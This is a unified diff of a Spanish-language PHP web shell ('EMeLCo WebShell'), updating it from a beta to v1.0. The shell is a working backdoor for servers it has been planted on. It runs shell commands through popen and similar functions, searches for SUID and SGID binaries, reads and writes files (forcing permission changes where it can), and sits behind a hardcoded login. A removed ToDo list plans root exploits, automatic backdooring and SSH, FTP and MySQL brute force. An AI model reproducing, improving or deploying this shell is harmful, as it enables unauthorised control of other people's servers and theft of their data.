@@ -15,72 +15,29 @@
      #+#+# #+#+#  #+#        #+#    #+# #+#    #+# #+#    #+# #+#        #+#        #+#       
      ###   ###   ########## #########   ########  ###    ### ########## ########## ########## 
 
-  EMeLCo PHP WebShell v1.0 Beta 1
+  EMelCo PHP WebShell v1.0
   Escrita por >> s E t H <<
   seth (at) el-hacker (dot) org
-  http://xd-blog.com.ar/
+  http://code.google.com/p/emelco/
   
-  Copyright (c) 2009 2010, EMeLCo
-  All rights reserved.
- 
-  Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
- 
-      * Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
-      * Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
-      * Neither the name of the authors nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
-
-  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+  http://elrincondeseth.wordpress.com/
+  http://foro.undersecurity.net/
+  http://0verl0ad.blogspot.com/
   
   Changelog:
-  1.0b1
-   [+] Arreglados varios bugs
-   [+] Agregados comentarios
-   [+] chmod, chgrp y chown
-   [+] Mejorada la función shell()
-   [+] Se puede poner clave
-   [+] Mejorada la función leerarchivo()
-   [+] Sin tiempo máximo de ejecución
-   [+] mas datos en w=info
-   [!] Los links en los créditos no tienen referer
-   [+] Elimina archivos también con comandos, sin usar unlink y rmdir
-   [+] Si no hay permisos para leer o escribir archivos, intenta cambiarlos
-  1.0a2
-   [+] Creditos
-   [+] Descarga de archivos
-   [!] leerarchivo() comprueba que $ruta no sea un directorio
-   [!] Cambios de apariencia en el phpinfo
-   [+] Eliminar archivos desde el navegador
-   [+] Mas iconos
-   [+] Bordes de colores en los textbox e input
-   [+] Ahora se pueden crear archivos y directorios desde el navegador
-   [+] Ahora se pueden subir archivos
-   [+] Ejecutar codigo php
-   [!] Los input estan mas parejos 
-   [+] Nuevo mailer
-   [+] Muestra mas información 
-  1.0a1
-   [+] Primera version
-   
-   ToDo:
-   [+] Agregar rootexploits
-   [+] Agregar exploits de php
-   [+] Agregar una shell remota tipo datacha0s
-   [+] Agregar backdoorizacion automática
-   [+] Agregar descripciones en los textarea e input--> onfocus="this.value=''; this.onfocus=null;"
-   [!] Eliminar un input del editor de archivos
-   [!] Mejorar las funciones para leer y escribir archivos
-   [+] Agregar brute force de ssh
-   [+] Agregar brute force de ftp
-   [+] Agregar brute force de mysql
-   [+] Agregar navegador de sql
-   [+] Agregar para mover y copiar los archivos
-   [+] Ejecutar comandos con http://us3.php.net/manual/en/function.pcntl-exec.php y http://ar2.php.net/manual/en/function.proc-open.php
+  1.0
+   [!] Arreglado un loop infinito en shellpopen() que se producia cuando no se podia ejecutar el comando por safe_mode
+   [!] No se muestran los resultados vacios de la ejecución de comandos en ?w=info
+   [!] Mejorada la lectura de archivos con readfile() y file()
+   [!] Ya no se muestra la contraseña al ingresarla
+ 
 */
 
 //Usuario (Dejalo vacio para que no pida clave):
 $nombre_usuario = 'seth';
 //hash sha1 de la clave
 $clave_usuario = 'a0f1ba7debe4a2049b0f84d7dd95009a812f0b1a'; //"EMeLCo"
+
 
 error_reporting(E_ALL); //desarrollo
 error_reporting(0); //final
@@ -89,7 +46,7 @@ error_reporting(0); //final
 
 set_time_limit(0);
 
-$nombre = 'EMeLCo PHP WebShell v1.0 Beta 1';
+$nombre = 'EMeLCo WebShell v1.0';
 
 // de php.net para contrarrestar magic_quotes_gpc
 if (get_magic_quotes_gpc()) {
@@ -130,7 +87,7 @@ if (isset($nombre_usuario) and ($nombre_usuario != "")){ //si tiene clave
                 }
                 '.base64_decode('ZnVuY3Rpb24gdXRmOF9lbmNvZGUgKCBhcmdTdHJpbmcgKSB7DQogICAgLy8gaHR0cDovL2tldmluLnZhbnpvbm5ldmVsZC5uZXQNCiAgICAvLyArICAgb3JpZ2luYWwgYnk6IFdlYnRvb2xraXQuaW5mbyAoaHR0cDovL3d3dy53ZWJ0b29sa2l0LmluZm8vKQ0KICAgIC8vICsgICBpbXByb3ZlZCBieTogS2V2aW4gdmFuIFpvbm5ldmVsZCAoaHR0cDovL2tldmluLnZhbnpvbm5ldmVsZC5uZXQpDQogICAgLy8gKyAgIGltcHJvdmVkIGJ5OiBzb3diZXJyeQ0KICAgIC8vICsgICAgdHdlYWtlZCBieTogSmFjaw0KICAgIC8vICsgICBidWdmaXhlZCBieTogT25ubyBNYXJzbWFuDQogICAgLy8gKyAgIGltcHJvdmVkIGJ5OiBZdmVzIFN1Y2FldA0KICAgIC8vICsgICBidWdmaXhlZCBieTogT25ubyBNYXJzbWFuDQogICAgLy8gKyAgIGJ1Z2ZpeGVkIGJ5OiBVbHJpY2gNCiAgICAvLyAqICAgICBleGFtcGxlIDE6IHV0ZjhfZW5jb2RlKCdLZXZpbiB2YW4gWm9ubmV2ZWxkJyk7DQogICAgLy8gKiAgICAgcmV0dXJucyAxOiAnS2V2aW4gdmFuIFpvbm5ldmVsZCcNCiANCiAgICB2YXIgc3RyaW5nID0gKGFyZ1N0cmluZysnJyk7IC8vIC5yZXBsYWNlKC9cclxuL2csICJcbiIpLnJlcGxhY2UoL1xyL2csICJcbiIpOw0KIA0KICAgIHZhciB1dGZ0ZXh0ID0gIiI7DQogICAgdmFyIHN0YXJ0LCBlbmQ7DQogICAgdmFyIHN0cmluZ2wgPSAwOw0KIA0KICAgIHN0YXJ0ID0gZW5kID0gMDsNCiAgICBzdHJpbmdsID0gc3RyaW5nLmxlbmd0aDsNCiAgICBmb3IgKHZhciBuID0gMDsgbiA8IHN0cmluZ2w7IG4rKykgew0KICAgICAgICB2YXIgYzEgPSBzdHJpbmcuY2hhckNvZGVBdChuKTsNCiAgICAgICAgdmFyIGVuYyA9IG51bGw7DQogDQogICAgICAgIGlmIChjMSA8IDEyOCkgew0KICAgICAgICAgICAgZW5kKys7DQogICAgICAgIH0gZWxzZSBpZiAoYzEgPiAxMjcgJiYgYzEgPCAyMDQ4KSB7DQogICAgICAgICAgICBlbmMgPSBTdHJpbmcuZnJvbUNoYXJDb2RlKChjMSA+PiA2KSB8IDE5MikgKyBTdHJpbmcuZnJvbUNoYXJDb2RlKChjMSAmIDYzKSB8IDEyOCk7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBlbmMgPSBTdHJpbmcuZnJvbUNoYXJDb2RlKChjMSA+PiAxMikgfCAyMjQpICsgU3RyaW5nLmZyb21DaGFyQ29kZSgoKGMxID4+IDYpICYgNjMpIHwgMTI4KSArIFN0cmluZy5mcm9tQ2hhckNvZGUoKGMxICYgNjMpIHwgMTI4KTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoZW5jICE9PSBudWxsKSB7DQogICAgICAgICAgICBpZiAoZW5kID4gc3RhcnQpIHsNCiAgICAgICAgICAgICAgICB1dGZ0ZXh0ICs9IHN0cmluZy5zdWJzdHJpbmcoc3RhcnQsIGVuZCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICB1dGZ0ZXh0ICs9IGVuYzsNCiAgICAgICAgICAgIHN0YXJ0ID0gZW5kID0gbisxOw0KICAgICAgICB9DQogICAgfQ0KIA0KICAgIGlmIChlbmQgPiBzdGFydCkgew0KICAgICAgICB1dGZ0ZXh0ICs9IHN0cmluZy5zdWJzdHJpbmcoc3RhcnQsIHN0cmluZy5sZW5ndGgpOw0KICAgIH0NCiANCiAgICByZXR1cm4gdXRmdGV4dDsNCn0=').base64_decode('ZnVuY3Rpb24gc2hhMSAoc3RyKSB7DQoNCiAgICAvLyBodHRwOi8va2V2aW4udmFuem9ubmV2ZWxkLm5ldA0KDQogICAgLy8gKyAgIG9yaWdpbmFsIGJ5OiBXZWJ0b29sa2l0LmluZm8gKGh0dHA6Ly93d3cud2VidG9vbGtpdC5pbmZvLykNCg0KICAgIC8vICsgbmFtZXNwYWNlZCBieTogTWljaGFlbCBXaGl0ZSAoaHR0cDovL2dldHNwcmluay5jb20pDQoNCiAgICAvLyArICAgICAgaW5wdXQgYnk6IEJyZXR0IFphbWlyIChodHRwOi8vYnJldHQtemFtaXIubWUpDQoNCiAgICAvLyArICAgaW1wcm92ZWQgYnk6IEtldmluIHZhbiBab25uZXZlbGQgKGh0dHA6Ly9rZXZpbi52YW56b25uZXZlbGQubmV0KQ0KDQogICAgLy8gLSAgICBkZXBlbmRzIG9uOiB1dGY4X2VuY29kZQ0KDQogICAgLy8gKiAgICAgZXhhbXBsZSAxOiBzaGExKCdLZXZpbiB2YW4gWm9ubmV2ZWxkJyk7DQoNCiAgICAvLyAqICAgICByZXR1cm5zIDE6ICc1NDkxNmQyZTYyZjY1YjNhZmE2ZTE5MmU2YTYwMWNkYmU1Y2I1ODk3Jw0KDQogDQoNCiAgICB2YXIgcm90YXRlX2xlZnQgPSBmdW5jdGlvbiAobixzKSB7DQoNCiAgICAgICAgdmFyIHQ0ID0gKCBuPDxzICkgfCAobj4+PigzMi1zKSk7DQoNCiAgICAgICAgcmV0dXJuIHQ0Ow0KDQogICAgfTsNCg0KIA0KDQogICAgLyp2YXIgbHNiX2hleCA9IGZ1bmN0aW9uICh2YWwpIHsgLy8gTm90IGluIHVzZTsgbmVlZGVkPw0KDQogICAgICAgIHZhciBzdHI9IiI7DQoNCiAgICAgICAgdmFyIGk7DQoNCiAgICAgICAgdmFyIHZoOw0KDQogICAgICAgIHZhciB2bDsNCg0KIA0KDQogICAgICAgIGZvciAoIGk9MDsgaTw9NjsgaSs9MiApIHsNCg0KICAgICAgICAgICAgdmggPSAodmFsPj4+KGkqNCs0KSkmMHgwZjsNCg0KICAgICAgICAgICAgdmwgPSAodmFsPj4+KGkqNCkpJjB4MGY7DQoNCiAgICAgICAgICAgIHN0ciArPSB2aC50b1N0cmluZygxNikgKyB2bC50b1N0cmluZygxNik7DQoNCiAgICAgICAgfQ0KDQogICAgICAgIHJldHVybiBzdHI7DQoNCiAgICB9OyovDQoNCiANCg0KICAgIHZhciBjdnRfaGV4ID0gZnVuY3Rpb24gKHZhbCkgew0KDQogICAgICAgIHZhciBzdHI9IiI7DQoNCiAgICAgICAgdmFyIGk7DQoNCiAgICAgICAgdmFyIHY7DQoNCiANCg0KICAgICAgICBmb3IgKGk9NzsgaT49MDsgaS0tKSB7DQoNCiAgICAgICAgICAgIHYgPSAodmFsPj4+KGkqNCkpJjB4MGY7DQoNCiAgICAgICAgICAgIHN0ciArPSB2LnRvU3RyaW5nKDE2KTsNCg0KICAgICAgICB9DQoNCiAgICAgICAgcmV0dXJuIHN0cjsNCg0KICAgIH07DQoNCiANCg0KICAgIHZhciBibG9ja3N0YXJ0Ow0KDQogICAgdmFyIGksIGo7DQoNCiAgICB2YXIgVyA9IG5ldyBBcnJheSg4MCk7DQoNCiAgICB2YXIgSDAgPSAweDY3NDUyMzAxOw0KDQogICAgdmFyIEgxID0gMHhFRkNEQUI4OTsNCg0KICAgIHZhciBIMiA9IDB4OThCQURDRkU7DQoNCiAgICB2YXIgSDMgPSAweDEwMzI1NDc2Ow0KDQogICAgdmFyIEg0ID0gMHhDM0QyRTFGMDsNCg0KICAgIHZhciBBLCBCLCBDLCBELCBFOw0KDQogICAgdmFyIHRlbXA7DQoNCiANCg0KICAgIHN0ciA9IHRoaXMudXRmOF9lbmNvZGUoc3RyKTsNCg0KICAgIHZhciBzdHJfbGVuID0gc3RyLmxlbmd0aDsNCg0KIA0KDQogICAgdmFyIHdvcmRfYXJyYXkgPSBbXTsNCg0KICAgIGZvciAoaT0wOyBpPHN0cl9sZW4tMzsgaSs9NCkgew0KDQogICAgICAgIGogPSBzdHIuY2hhckNvZGVBdChpKTw8MjQgfCBzdHIuY2hhckNvZGVBdChpKzEpPDwxNiB8DQoNCiAgICAgICAgc3RyLmNoYXJDb2RlQXQoaSsyKTw8OCB8IHN0ci5jaGFyQ29kZUF0KGkrMyk7DQoNCiAgICAgICAgd29yZF9hcnJheS5wdXNoKCBqICk7DQoNCiAgICB9DQoNCiANCg0KICAgIHN3aXRjaCAoc3RyX2xlbiAlIDQpIHsNCg0KICAgICAgICBjYXNlIDA6DQoNCiAgICAgICAgICAgIGkgPSAweDA4MDAwMDAwMDsNCg0KICAgICAgICBicmVhazsNCg0KICAgICAgICBjYXNlIDE6DQoNCiAgICAgICAgICAgIGkgPSBzdHIuY2hhckNvZGVBdChzdHJfbGVuLTEpPDwyNCB8IDB4MDgwMDAwMDsNCg0KICAgICAgICBicmVhazsNCg0KICAgICAgICBjYXNlIDI6DQoNCiAgICAgICAgICAgIGkgPSBzdHIuY2hhckNvZGVBdChzdHJfbGVuLTIpPDwyNCB8IHN0ci5jaGFyQ29kZUF0KHN0cl9sZW4tMSk8PDE2IHwgMHgwODAwMDsNCg0KICAgICAgICBicmVhazsNCg0KICAgICAgICBjYXNlIDM6DQoNCiAgICAgICAgICAgIGkgPSBzdHIuY2hhckNvZGVBdChzdHJfbGVuLTMpPDwyNCB8IHN0ci5jaGFyQ29kZUF0KHN0cl9sZW4tMik8PDE2IHwgc3RyLmNoYXJDb2RlQXQoc3RyX2xlbi0xKTw8OCAgICB8IDB4ODA7DQoNCiAgICAgICAgYnJlYWs7DQoNCiAgICB9DQoNCiANCg0KICAgIHdvcmRfYXJyYXkucHVzaCggaSApOw0KDQogDQoNCiAgICB3aGlsZSAoKHdvcmRfYXJyYXkubGVuZ3RoICUgMTYpICE9IDE0ICkge3dvcmRfYXJyYXkucHVzaCggMCApO30NCg0KIA0KDQogICAgd29yZF9hcnJheS5wdXNoKCBzdHJfbGVuPj4+MjkgKTsNCg0KICAgIHdvcmRfYXJyYXkucHVzaCggKHN0cl9sZW48PDMpJjB4MGZmZmZmZmZmICk7DQoNCiANCg0KICAgIGZvciAoIGJsb2Nrc3RhcnQ9MDsgYmxvY2tzdGFydDx3b3JkX2FycmF5Lmxlbmd0aDsgYmxvY2tzdGFydCs9MTYgKSB7DQoNCiAgICAgICAgZm9yIChpPTA7IGk8MTY7IGkrKykge1dbaV0gPSB3b3JkX2FycmF5W2Jsb2Nrc3RhcnQraV07fQ0KDQogICAgICAgIGZvciAoaT0xNjsgaTw9Nzk7IGkrKykge1dbaV0gPSByb3RhdGVfbGVmdChXW2ktM10gXiBXW2ktOF0gXiBXW2ktMTRdIF4gV1tpLTE2XSwgMSk7fQ0KDQogDQoNCiANCg0KICAgICAgICBBID0gSDA7DQoNCiAgICAgICAgQiA9IEgxOw0KDQogICAgICAgIEMgPSBIMjsNCg0KICAgICAgICBEID0gSDM7DQoNCiAgICAgICAgRSA9IEg0Ow0KDQogDQoNCiAgICAgICAgZm9yIChpPSAwOyBpPD0xOTsgaSsrKSB7DQoNCiAgICAgICAgICAgIHRlbXAgPSAocm90YXRlX2xlZnQoQSw1KSArICgoQiZDKSB8ICh+QiZEKSkgKyBFICsgV1tpXSArIDB4NUE4Mjc5OTkpICYgMHgwZmZmZmZmZmY7DQoNCiAgICAgICAgICAgIEUgPSBEOw0KDQogICAgICAgICAgICBEID0gQzsNCg0KICAgICAgICAgICAgQyA9IHJvdGF0ZV9sZWZ0KEIsMzApOw0KDQogICAgICAgICAgICBCID0gQTsNCg0KICAgICAgICAgICAgQSA9IHRlbXA7DQoNCiAgICAgICAgfQ0KDQogDQoNCiAgICAgICAgZm9yIChpPTIwOyBpPD0zOTsgaSsrKSB7DQoNCiAgICAgICAgICAgIHRlbXAgPSAocm90YXRlX2xlZnQoQSw1KSArIChCIF4gQyBeIEQpICsgRSArIFdbaV0gKyAweDZFRDlFQkExKSAmIDB4MGZmZmZmZmZmOw0KDQogICAgICAgICAgICBFID0gRDsNCg0KICAgICAgICAgICAgRCA9IEM7DQoNCiAgICAgICAgICAgIEMgPSByb3RhdGVfbGVmdChCLDMwKTsNCg0KICAgICAgICAgICAgQiA9IEE7DQoNCiAgICAgICAgICAgIEEgPSB0ZW1wOw0KDQogICAgICAgIH0NCg0KIA0KDQogICAgICAgIGZvciAoaT00MDsgaTw9NTk7IGkrKykgew0KDQogICAgICAgICAgICB0ZW1wID0gKHJvdGF0ZV9sZWZ0KEEsNSkgKyAoKEImQykgfCAoQiZEKSB8IChDJkQpKSArIEUgKyBXW2ldICsgMHg4RjFCQkNEQykgJiAweDBmZmZmZmZmZjsNCg0KICAgICAgICAgICAgRSA9IEQ7DQoNCiAgICAgICAgICAgIEQgPSBDOw0KDQogICAgICAgICAgICBDID0gcm90YXRlX2xlZnQoQiwzMCk7DQoNCiAgICAgICAgICAgIEIgPSBBOw0KDQogICAgICAgICAgICBBID0gdGVtcDsNCg0KICAgICAgICB9DQoNCiANCg0KICAgICAgICBmb3IgKGk9NjA7IGk8PTc5OyBpKyspIHsNCg0KICAgICAgICAgICAgdGVtcCA9IChyb3RhdGVfbGVmdChBLDUpICsgKEIgXiBDIF4gRCkgKyBFICsgV1tpXSArIDB4Q0E2MkMxRDYpICYgMHgwZmZmZmZmZmY7DQoNCiAgICAgICAgICAgIEUgPSBEOw0KDQogICAgICAgICAgICBEID0gQzsNCg0KICAgICAgICAgICAgQyA9IHJvdGF0ZV9sZWZ0KEIsMzApOw0KDQogICAgICAgICAgICBCID0gQTsNCg0KICAgICAgICAgICAgQSA9IHRlbXA7DQoNCiAgICAgICAgfQ0KDQogDQoNCiAgICAgICAgSDAgPSAoSDAgKyBBKSAmIDB4MGZmZmZmZmZmOw0KDQogICAgICAgIEgxID0gKEgxICsgQikgJiAweDBmZmZmZmZmZjsNCg0KICAgICAgICBIMiA9IChIMiArIEMpICYgMHgwZmZmZmZmZmY7DQoNCiAgICAgICAgSDMgPSAoSDMgKyBEKSAmIDB4MGZmZmZmZmZmOw0KDQogICAgICAgIEg0ID0gKEg0ICsgRSkgJiAweDBmZmZmZmZmZjsNCg0KICAgIH0NCg0KIA0KDQogICAgdGVtcCA9IGN2dF9oZXgoSDApICsgY3Z0X2hleChIMSkgKyBjdnRfaGV4KEgyKSArIGN2dF9oZXgoSDMpICsgY3Z0X2hleChINCk7DQoNCiAgICByZXR1cm4gdGVtcC50b0xvd2VyQ2FzZSgpOw0KDQp9').'
             </script></head><body><form name="f">
-                Usuario: <input name="u" type="text" action="#"><br>Clave: <input name="c" type="text"><br><input type="submit" value="Entrar" onclick="saveIt()">
+                Usuario: <input name="u" type="text" action="#"><br>Clave: <input name="c" type="password"><br><input type="submit" value="Entrar" onclick="saveIt()">
             </form></body></html>
         ');
     }
@@ -428,7 +385,7 @@ Si no, es un archivo */
 $comandos =
 '><a href="?w=shell&comando=find%20%2F%20-type%20f%20-perm%20-04000%20-ls ">SUID</a>
 ><a href="?w=shell&comando=find%20%2F%20-type%20f%20-perm%20-02000%20-ls ">SGID</a>
->Memoria:
+>Memoria
 <free -m
 >Discos / Particiones
 <df -h
@@ -672,7 +629,7 @@ psybnc.conf
                 $lineas = substr_count($resultado,"\n");
                 if ($lineas>15){ $lineas = 15; }        //el maximo de lineas del textarea es 15
                 //mostramos el div y el textarea con el resultado
-                echo '<div class="s">'.htmlentities(substr($comando,1), ENT_QUOTES, 'UTF-8').':</div><textarea style="width:100%;" rows="'.$lineas.'">'.htmlentities($resultado,ENT_QUOTES, 'UTF-8').'</textarea><br><br>'; 
+                if ($resultado!=false){ echo '<div class="s">'.htmlentities(substr($comando,1), ENT_QUOTES, 'UTF-8').':</div><textarea style="width:100%;" rows="'.$lineas.'">'.htmlentities($resultado,ENT_QUOTES, 'UTF-8').'</textarea><br><br>'; } 
             }else{      //es un archivo, llamamos a la funcion que lo muestra en un textarea
                 mostrararchivo($comando);
             }
@@ -1156,16 +1113,17 @@ function shell($cmd, $array = true){
 }
 function shellpopen($cmd){
 /* fuente: antichat webshell v1.3 */
-  $fp = popen($cmd,"r");
-  {
+  if($fp = popen($cmd,"r")){ 
     $result = "";
     while(!feof($fp)){$result.=fread($fp,1024);}
     pclose($fp);
+  
+    $ret = $result;
+    $ret = convert_cyr_string($ret,"d","w");
+    return $ret;
+  }else{
+    return false;
   }
-  $ret = $result;
-  $ret = convert_cyr_string($ret,"d","w");
-
-return $ret;
 }
 function systemreturn($cmd){
     ob_start();
@@ -1274,8 +1232,14 @@ function leerarchivo($ruta){
         $permisosviejos = FALSE;
     }
     
-    if(($salida = leerarchivofopen($ruta))!==FALSE){
-    }elseif(($salida = file_get_contents($ruta))!==FALSE){
+    if(($salida = leerarchivofopen($ruta))!==false){
+        
+    }elseif(($salida = leerarchivoreadfile($ruta))!==false){
+        
+    }elseif(($salida = implode('', file($ruta)))!==false){
+        
+    }elseif(($salida = file_get_contents($ruta))!==false){
+
     }else{ $salida = FALSE; }
     
     if ($permisosviejos !== FALSE){
@@ -1292,6 +1256,13 @@ function leerarchivofopen($ruta){
     }
     fclose($handle);
     return $contents;
+}
+function leerarchivoreadfile($ruta){
+    ob_start();
+        $error = readfile($ruta);
+        $salida = ob_get_clean();
+    ob_end_clean();
+    if ($error!==false){return $salida;} else {return false;}
 }
 
 //escribe en un archivo
@@ -1361,7 +1332,7 @@ function mostrararchivo($ruta,$loc = true){
             }
         }
     }else{
-            echo '<div class="n" style="text-decoration: underline;">No se puede leer '.htmlentities($ruta, ENT_QUOTES, 'UTF-8').' porque supera los 50000 bytes</div><br>';
+            echo '<div class="n" style="text-decoration: underline;">No se puede leer '.    htmlentities($ruta, ENT_QUOTES, 'UTF-8').' porque supera los 50000 bytes</div><br>';
     }
 }
 
